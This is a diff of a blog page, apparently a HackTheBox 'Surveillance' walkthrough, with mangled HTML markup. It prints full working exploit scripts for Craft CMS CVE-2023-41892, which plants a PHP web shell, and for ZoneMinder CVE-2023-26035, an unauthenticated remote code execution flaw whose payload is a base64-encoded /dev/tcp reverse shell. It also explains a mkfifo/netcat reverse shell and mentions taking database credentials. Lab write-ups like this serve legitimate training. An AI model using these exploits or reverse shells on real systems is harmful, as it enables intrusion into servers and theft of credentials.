@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Surveillance-Linux-Medium</h1>
   
@@ -74,95 +66,96 @@
 </aside>
 
 <h2 id="1-enumeration">1: Enumeration</h2>
-
+<p><br /><br /></p>
 <ul>
-  <li>Check the active connection</li>
-</ul>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled.png" alt="Untitled" /></p>
-
-<ul>
-  <li>Scanning ports</li>
-</ul>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_1.png" alt="Untitled" /></p>
-
-<p>We can see there’s a web services running in 80 port and ssh service in 22</p>
-
-<h2 id="2-looking-around">2: Looking around</h2>
-
-<ul>
-  <li>There is a web service powered by Craft CMS in the main page. CVE-2023-41892 is a vulnerability for this technology, we need to execute a POC for this vulnerability, but after a lot of time fixing parameters made by machine configurations we find the right version of the exploit.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+  <li>Check the active connection
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled.png" alt="Untitled" />
+<br /><br /></li>
+  <li>Scanning ports
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_1.png" alt="Untitled" />
+<br /><br />
+We can see there’s a web services running in 80 port and ssh service in 22 
+<br /><br />
+    <h2 id="2-looking-around">2: Looking around</h2>
+    <p><br /><br /></p>
+  </li>
+  <li>There is a web service powered by Craft CMS in the main page. CVE-2023-41892 is a vulnerability for this technology, we need to execute a POC for this vulnerability, but after a lot of time fixing parameters made by machine configurations we find the right version of the exploit.
+<br /><br />
+```bash
+import requests
 import re
-import sys
+import sys</li>
+</ul>
 
-headers <span class="o">=</span> <span class="o">{</span>
-    <span class="s2">"User-Agent"</span>: <span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"</span>
-<span class="o">}</span>
+<p>headers = {
+    “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36”
+}</p>
 
-def writePayloadToTempFile<span class="o">(</span>documentRoot<span class="o">)</span>:
-    data <span class="o">=</span> <span class="o">{</span>
-        <span class="s2">"action"</span>: <span class="s2">"conditions/render"</span>,
-        <span class="s2">"configObject[class]"</span>: <span class="s2">"craft</span><span class="se">\e</span><span class="s2">lements</span><span class="se">\c</span><span class="s2">onditions</span><span class="se">\E</span><span class="s2">lementCondition"</span>,
-        <span class="s2">"config"</span>: <span class="s1">'{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:"}}}'</span>
-    <span class="o">}</span>
-
-    files <span class="o">=</span> <span class="o">{</span>
-        <span class="s2">"image1"</span>: <span class="o">(</span><span class="s2">"pwn1.msl"</span>, <span class="s2">"""&lt;?xml version="</span>1.0<span class="s2">" encoding="</span>UTF-8<span class="s2">"?&gt;
-        &lt;image&gt;
-        &lt;read filename="</span>caption:&amp;lt<span class="p">;</span>?php @system<span class="o">(</span>@<span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&amp;gt<span class="p">;</span><span class="s2">"/&gt;
-        &lt;write filename="</span>info:DOCUMENTROOT/cpresources/shell.php<span class="s2">"&gt;
-        &lt;/image&gt;"""</span>.replace<span class="o">(</span><span class="s2">"DOCUMENTROOT"</span>, documentRoot<span class="o">)</span>, <span class="s2">"text/plain"</span><span class="o">)</span>
-    <span class="o">}</span>
-
-    response <span class="o">=</span> requests.post<span class="o">(</span>url, <span class="nv">headers</span><span class="o">=</span>headers, <span class="nv">data</span><span class="o">=</span>data, <span class="nv">files</span><span class="o">=</span>files, <span class="nv">proxies</span><span class="o">={</span><span class="s2">"http"</span>: <span class="s2">"http://127.0.0.1:8080"</span><span class="o">})</span>
-
-def getTmpUploadDirAndDocumentRoot<span class="o">()</span>:
-    data <span class="o">=</span> <span class="o">{</span>
-        <span class="s2">"action"</span>: <span class="s2">"conditions/render"</span>,
-        <span class="s2">"configObject[class]"</span>: <span class="s2">"craft</span><span class="se">\e</span><span class="s2">lements</span><span class="se">\c</span><span class="s2">onditions</span><span class="se">\E</span><span class="s2">lementCondition"</span>,
-        <span class="s2">"config"</span>: r<span class="s1">'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'</span>
-    <span class="o">}</span>
-
-    response <span class="o">=</span> requests.post<span class="o">(</span>url, <span class="nv">headers</span><span class="o">=</span>headers, <span class="nv">data</span><span class="o">=</span>data<span class="o">)</span>
-
-    pattern1 <span class="o">=</span> r<span class="s1">'&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;'</span>
-    pattern2 <span class="o">=</span> r<span class="s1">'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'</span>DOCUMENT_ROOT<span class="se">\'\]</span>&lt;<span class="se">\/</span>td&gt;&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"v"</span><span class="o">&gt;([</span>^&lt;<span class="o">]</span>+<span class="o">)</span>&lt;<span class="se">\/</span>td&gt;&lt;<span class="se">\/</span><span class="nb">tr</span><span class="o">&gt;</span><span class="s1">'
-
-    match1 = re.search(pattern1, response.text, re.DOTALL)
-    match2 = re.search(pattern2, response.text, re.DOTALL)
-    print(match1.group(1), match2.group(1))
-    return match1.group(1), match2.group(1)
-
-def trigerImagick(tmpDir):
+<p>def writePayloadToTempFile(documentRoot):
     data = {
-        "action": "conditions/render",
-        "configObject[class]": "craft\elements\conditions\ElementCondition",
-        "config": '</span><span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"configObject"</span>,<span class="s2">"as "</span>:<span class="o">{</span><span class="s2">"class"</span>:<span class="s2">"Imagick"</span>, <span class="s2">"__construct()"</span>:<span class="o">{</span><span class="s2">"files"</span>:<span class="s2">"vid:msl:' + tmpDir + r'/php*"</span><span class="o">}}}</span><span class="s1">'
+        “action”: “conditions/render”,
+        “configObject[class]”: “craft\elements\conditions\ElementCondition”,
+        “config”: ‘{“name”:”configObject”,”as “:{“class”:”Imagick”, “__construct()”:{“files”:”msl:”}}}’
+    }</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>files = {
+    "image1": ("pwn1.msl", """&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+    &lt;image&gt;
+    &lt;read filename="caption:&amp;lt;?php @system(@$_REQUEST['cmd']); ?&amp;gt;"/&gt;
+    &lt;write filename="info:DOCUMENTROOT/cpresources/shell.php"&gt;
+    &lt;/image&gt;""".replace("DOCUMENTROOT", documentRoot), "text/plain")
+}
+
+response = requests.post(url, headers=headers, data=data, files=files, proxies={"http": "http://127.0.0.1:8080"})
+</code></pre></div></div>
+
+<p>def getTmpUploadDirAndDocumentRoot():
+    data = {
+        “action”: “conditions/render”,
+        “configObject[class]”: “craft\elements\conditions\ElementCondition”,
+        “config”: r’{“name”:”configObject”,”as “:{“class”:”\GuzzleHttp\Psr7\FnStream”, “__construct()”:{“methods”:{“close”:”phpinfo”}}}}’
+    }</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>response = requests.post(url, headers=headers, data=data)
+
+pattern1 = r'&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;'
+pattern2 = r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;\/td&gt;&lt;td class="v"&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;'
+
+match1 = re.search(pattern1, response.text, re.DOTALL)
+match2 = re.search(pattern2, response.text, re.DOTALL)
+print(match1.group(1), match2.group(1))
+return match1.group(1), match2.group(1)
+</code></pre></div></div>
+
+<p>def trigerImagick(tmpDir):
+    data = {
+        “action”: “conditions/render”,
+        “configObject[class]”: “craft\elements\conditions\ElementCondition”,
+        “config”: ‘{“name”:”configObject”,”as “:{“class”:”Imagick”, “__construct()”:{“files”:”vid:msl:’ + tmpDir + r’/php*”}}}’
     }
-    response = requests.post(url, headers=headers, data=data)
+    response = requests.post(url, headers=headers, data=data)</p>
 
-def shell(cmd):
-    response = requests.get(base_url + "/cpresources/shell.php", params={"cmd": cmd})
-    match = re.search(r'</span>caption:<span class="o">(</span>.<span class="k">*</span>?<span class="o">)</span>CAPTION<span class="s1">', response.text, re.DOTALL)
+<p>def shell(cmd):
+    response = requests.get(base_url + “/cpresources/shell.php”, params={“cmd”: cmd})
+    match = re.search(r’caption:(.*?)CAPTION’, response.text, re.DOTALL)</p>
 
-    if match:
-        extracted_text = match.group(1).strip()
-        print(extracted_text)
-    else:
-        return None
-    return extracted_text
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if match:
+    extracted_text = match.group(1).strip()
+    print(extracted_text)
+else:
+    return None
+return extracted_text
+</code></pre></div></div>
 
-if __name__ == "__main__":
+<p>if <strong>name</strong> == “<strong>main</strong>”:
     if (len(sys.argv) != 2):
-        print("Usage: python CVE-2023-41892.py &lt;url&gt;")
+        print(“Usage: python CVE-2023-41892.py <url>")
         exit()
     else:
         url = sys.argv[1]
-        base_url = '</span>http://surveillance.htb<span class="s1">'
+        base_url = 'http://surveillance.htb'
         print("[-] Get temporary folder and document root ...")
         upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
         tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
@@ -170,194 +163,155 @@ if __name__ == "__main__":
         try:
             writePayloadToTempFile(documentRoot)
         except requests.exceptions.ConnectionError as e:
-            print("[-] Crash the php process and write temp file successfully")
+            print("[-] Crash the php process and write temp file successfully")</url></p>
 
-        print("[-] Trigger imagick to write shell ...")
-        try:
-            trigerImagick(tmpDir)
-        except:
-            pass
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    print("[-] Trigger imagick to write shell ...")
+    try:
+        trigerImagick(tmpDir)
+    except:
+        pass
 
-        print("[-] Done, enjoy the shell")
-        while True:
-            cmd = input("$ ")
-            shell(cmd)
-</span></code></pre></div></div>
-
-<ul>
-  <li></li>
-</ul>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_2.png" alt="Untitled" /></p>
-
-<ul>
-  <li>Make a little bit more stable the bash</li>
-</ul>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_3.png" alt="Untitled" /></p>
-
-<p>This is pretty much it:</p>
-
-<ol>
-  <li><strong><code class="language-plaintext highlighter-rouge">**rm /tmp/f**</code>:</strong></li>
-</ol>
-
-<p>— Deletes any existing file named <code class="language-plaintext highlighter-rouge">/tmp/f</code> to ensure a fresh start.</p>
-
-<ol>
-  <li><strong><code class="language-plaintext highlighter-rouge">**mkfifo /tmp/f**</code>:</strong></li>
-</ol>
-
-<p>— Creates a named pipe (FIFO) named <code class="language-plaintext highlighter-rouge">/tmp/f</code>. A named pipe is a special type of file that allows processes to communicate.</p>
-
-<ol>
-  <li><strong><code class="language-plaintext highlighter-rouge">**cat /tmp/f | /bin/bash -i 2&gt;&amp;1**</code>:</strong></li>
-</ol>
-
-<p>— Reads from the named pipe (<code class="language-plaintext highlighter-rouge">/tmp/f</code>) and pipes the content to <code class="language-plaintext highlighter-rouge">/bin/bash</code> with the <code class="language-plaintext highlighter-rouge">-i</code> option for an interactive shell.</p>
-
-<p>— The <code class="language-plaintext highlighter-rouge">2&gt;&amp;1</code> redirects standard error (file descriptor 2) to standard output (file descriptor 1), ensuring that error messages are also sent through the pipeline.</p>
-
-<ol>
-  <li><strong><code class="language-plaintext highlighter-rouge">**nc 10.10.x.x 4444 &gt;/tmp/f**</code>:</strong></li>
-</ol>
-
-<p>— Initiates a Netcat (<code class="language-plaintext highlighter-rouge">nc</code>) connection to the IP address <code class="language-plaintext highlighter-rouge">10.10.x.x</code> on port <code class="language-plaintext highlighter-rouge">4444</code>.</p>
-
-<p>— The standard output of the entire pipeline (which includes the output of the Bash shell) is redirected to the named pipe <code class="language-plaintext highlighter-rouge">/tmp/f</code>. This completes the loop, sending the shell output back into the named pipe, creating a bidirectional communication channel</p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_4.png" alt="Untitled" /></p>
-
-<h2 id="3-user-flag">3: User flag</h2>
-
-<p>Got db creds</p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_5.png" alt="Untitled" /></p>
-
-<p>Just hash with</p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_6.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_7.png" alt="Untitled" /></p>
-
-<h2 id="4-priv-esc">4: Priv esc</h2>
-
-<ul>
-  <li>We check active connections with</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat <span class="nt">-natu</span> <span class="nt">-nltp</span>
+    print("[-] Done, enjoy the shell")
+    while True:
+        cmd = input("$ ")
+        shell(cmd) ``` &lt;br/&gt;&lt;br/&gt; - 
 </code></pre></div></div>
 
-<p>There is something running locally</p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_8.png" alt="Untitled" /></p>
-
-<p>We go to /etc/nignx/sites-enable and cat zoneminder.conf</p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_9.png" alt="Untitled" /></p>
-
-<p>There is a zoneminder service running that is a monitored technology lets port fowarding with ssh</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> port:ip:port
-</code></pre></div></div>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_10.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_11.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_12.png" alt="Untitled" /></p>
-
-<p>Info about zoneminder versions, lets look for some vulnerability</p>
-
-<p>(CVE-202326035) POC</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import re
+<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_2.png" alt="Untitled" />
+<br /><br /></p>
+<ul>
+  <li>Make a little bit more stable the bash
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_3.png" alt="Untitled" />
+<br /><br />
+This is pretty much it:
+<br /><br />
+    <ol>
+      <li><strong><code class="language-plaintext highlighter-rouge">**rm /tmp/f**</code>:</strong>
+<br /><br />
+— Deletes any existing file named <code class="language-plaintext highlighter-rouge">/tmp/f</code> to ensure a fresh start.
+<br /><br /></li>
+      <li><strong><code class="language-plaintext highlighter-rouge">**mkfifo /tmp/f**</code>:</strong>
+<br /><br />
+— Creates a named pipe (FIFO) named <code class="language-plaintext highlighter-rouge">/tmp/f</code>. A named pipe is a special type of file that allows processes to communicate.
+<br /><br /></li>
+      <li><strong><code class="language-plaintext highlighter-rouge">**cat /tmp/f | /bin/bash -i 2&gt;&amp;1**</code>:</strong>
+<br /><br />
+— Reads from the named pipe (<code class="language-plaintext highlighter-rouge">/tmp/f</code>) and pipes the content to <code class="language-plaintext highlighter-rouge">/bin/bash</code> with the <code class="language-plaintext highlighter-rouge">-i</code> option for an interactive shell.
+<br /><br />
+— The <code class="language-plaintext highlighter-rouge">2&gt;&amp;1</code> redirects standard error (file descriptor 2) to standard output (file descriptor 1), ensuring that error messages are also sent through the pipeline.
+<br /><br /></li>
+      <li><strong><code class="language-plaintext highlighter-rouge">**nc 10.10.x.x 4444 &gt;/tmp/f**</code>:</strong>
+<br /><br />
+— Initiates a Netcat (<code class="language-plaintext highlighter-rouge">nc</code>) connection to the IP address <code class="language-plaintext highlighter-rouge">10.10.x.x</code> on port <code class="language-plaintext highlighter-rouge">4444</code>.
+<br /><br />
+— The standard output of the entire pipeline (which includes the output of the Bash shell) is redirected to the named pipe <code class="language-plaintext highlighter-rouge">/tmp/f</code>. This completes the loop, sending the shell output back into the named pipe, creating a bidirectional communication channel
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_4.png" alt="Untitled" />
+<br /><br />
+        <h2 id="3-user-flag">3: User flag</h2>
+        <p><br /><br />
+Got db creds 
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_5.png" alt="Untitled" />
+<br /><br />
+Just hash with
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_6.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_7.png" alt="Untitled" />
+<br /><br /></p>
+        <h2 id="4-priv-esc">4: Priv esc</h2>
+        <p><br /><br /></p>
+      </li>
+    </ol>
+  </li>
+  <li>We check active connections with
+<br /><br />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat <span class="nt">-natu</span> <span class="nt">-nltp</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+There is something running locally
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_8.png" alt="Untitled" />
+<br /><br />
+We go to /etc/nignx/sites-enable and cat zoneminder.conf
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_9.png" alt="Untitled" />
+<br /><br />
+There is a zoneminder service running that is a monitored technology lets port fowarding with ssh
+<br /><br /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> port:ip:port
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_10.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_11.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_12.png" alt="Untitled" />
+<br /><br />
+Info about zoneminder versions, lets look for some vulnerability
+<br /><br />
+(CVE-202326035) POC 
+<br /><br />
+```bash
+import re
 import requests
 from bs4 import BeautifulSoup
 import argparse
-import <span class="nb">base64</span>
+import base64</p>
+  </li>
+</ul>
 
-<span class="c"># CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots</span>
-<span class="c"># Author : Ravindu Wickramasinghe | rvz (@RVIZX9)</span>
+<h1 id="cve-2023-26035---unauthenticated-rce-in-zoneminder-snapshots">CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots</h1>
+<h1 id="author--ravindu-wickramasinghe--rvz-rvizx9">Author : Ravindu Wickramasinghe | rvz (@RVIZX9)</h1>
 
-class ZoneMinderExploit:
-    def __init__<span class="o">(</span>self, target_uri<span class="o">)</span>:
-        self.target_uri <span class="o">=</span> target_uri
-        self.csrf_magic <span class="o">=</span> None
+<p>class ZoneMinderExploit:
+    def <strong>init</strong>(self, target_uri):
+        self.target_uri = target_uri
+        self.csrf_magic = None</p>
 
-    def fetch_csrf_token<span class="o">(</span>self<span class="o">)</span>:
-        print<span class="o">(</span><span class="s2">"[&gt;] fetching csrt token"</span><span class="o">)</span>
-        response <span class="o">=</span> requests.get<span class="o">(</span>self.target_uri<span class="o">)</span>
-        self.csrf_magic <span class="o">=</span> self.get_csrf_magic<span class="o">(</span>response<span class="o">)</span>
-        <span class="k">if </span>response.status_code <span class="o">==</span> 200 and re.match<span class="o">(</span>r<span class="s1">'^key:[a-f0-9]{40},\d+'</span>, self.csrf_magic<span class="o">)</span>:
-            print<span class="o">(</span>f<span class="s2">"[&gt;] recieved the token: {self.csrf_magic}"</span><span class="o">)</span>
-            <span class="k">return </span>True
-        print<span class="o">(</span><span class="s2">"[!] unable to fetch or parse token."</span><span class="o">)</span>
-        <span class="k">return </span>False
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def fetch_csrf_token(self):
+    print("[&gt;] fetching csrt token")
+    response = requests.get(self.target_uri)
+    self.csrf_magic = self.get_csrf_magic(response)
+    if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\d+', self.csrf_magic):
+        print(f"[&gt;] recieved the token: {self.csrf_magic}")
+        return True
+    print("[!] unable to fetch or parse token.")
+    return False
 
-    def get_csrf_magic<span class="o">(</span>self, response<span class="o">)</span>:
-        <span class="k">return </span>BeautifulSoup<span class="o">(</span>response.text, <span class="s1">'html.parser'</span><span class="o">)</span>.find<span class="o">(</span><span class="s1">'input'</span>, <span class="o">{</span><span class="s1">'name'</span>: <span class="s1">'__csrf_magic'</span><span class="o">})</span>.get<span class="o">(</span><span class="s1">'value'</span>, None<span class="o">)</span>
+def get_csrf_magic(self, response):
+    return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)
 
-    def execute_command<span class="o">(</span>self, cmd<span class="o">)</span>:
-        print<span class="o">(</span><span class="s2">"[&gt;] sending payload.."</span><span class="o">)</span>
-        data <span class="o">=</span> <span class="o">{</span><span class="s1">'view'</span>: <span class="s1">'snapshot'</span>, <span class="s1">'action'</span>: <span class="s1">'create'</span>, <span class="s1">'monitor_ids[0][Id]'</span>: f<span class="s1">';{cmd}'</span>, <span class="s1">'__csrf_magic'</span>: self.csrf_magic<span class="o">}</span>
-        response <span class="o">=</span> requests.post<span class="o">(</span>f<span class="s2">"{self.target_uri}/index.php"</span>, <span class="nv">data</span><span class="o">=</span>data<span class="o">)</span>
-        print<span class="o">(</span><span class="s2">"[&gt;] payload sent"</span> <span class="k">if </span>response.status_code <span class="o">==</span> 200 <span class="k">else</span> <span class="s2">"[!] failed to send payload"</span><span class="o">)</span>
+def execute_command(self, cmd):
+    print("[&gt;] sending payload..")
+    data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}
+    response = requests.post(f"{self.target_uri}/index.php", data=data)
+    print("[&gt;] payload sent" if response.status_code == 200 else "[!] failed to send payload")
 
-    def exploit<span class="o">(</span>self, payload<span class="o">)</span>:
-        <span class="k">if </span>self.fetch_csrf_token<span class="o">()</span>:
-            print<span class="o">(</span>f<span class="s2">"[&gt;] executing..."</span><span class="o">)</span>
-            self.execute_command<span class="o">(</span>payload<span class="o">)</span>
-
-<span class="k">if </span>__name__ <span class="o">==</span> <span class="s2">"__main__"</span>:
-    parser <span class="o">=</span> argparse.ArgumentParser<span class="o">()</span>
-    parser.add_argument<span class="o">(</span><span class="s1">'-t'</span>, <span class="s1">'--target-url'</span>, <span class="nv">required</span><span class="o">=</span>True, <span class="nb">help</span><span class="o">=</span><span class="s1">'target url endpoint'</span><span class="o">)</span>
-    parser.add_argument<span class="o">(</span><span class="s1">'-ip'</span>, <span class="s1">'--local-ip'</span>, <span class="nv">required</span><span class="o">=</span>True, <span class="nb">help</span><span class="o">=</span><span class="s1">'local ip'</span><span class="o">)</span>
-    parser.add_argument<span class="o">(</span><span class="s1">'-p'</span>, <span class="s1">'--port'</span>, <span class="nv">required</span><span class="o">=</span>True, <span class="nb">help</span><span class="o">=</span><span class="s1">'port'</span><span class="o">)</span>
-    args <span class="o">=</span> parser.parse_args<span class="o">()</span>
-
-    <span class="c"># generating the payload</span>
-    ps1 <span class="o">=</span> f<span class="s2">"bash -i &gt;&amp; /dev/tcp/{args.local_ip}/{args.port} 0&gt;&amp;1"</span>  
-    ps2 <span class="o">=</span> base64.b64encode<span class="o">(</span>ps1.encode<span class="o">())</span>.decode<span class="o">()</span>
-    payload <span class="o">=</span> f<span class="s2">"echo {ps2} | base64 -d | /bin/bash"</span>
-
-    ZoneMinderExploit<span class="o">(</span>args.target_url<span class="o">)</span>.exploit<span class="o">(</span>payload<span class="o">)</span>
+def exploit(self, payload):
+    if self.fetch_csrf_token():
+        print(f"[&gt;] executing...")
+        self.execute_command(payload)
 </code></pre></div></div>
 
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_13.png" alt="Untitled" /></p>
+<p>if <strong>name</strong> == “<strong>main</strong>”:
+    parser = argparse.ArgumentParser()
+    parser.add_argument(‘-t’, ‘–target-url’, required=True, help=’target url endpoint’)
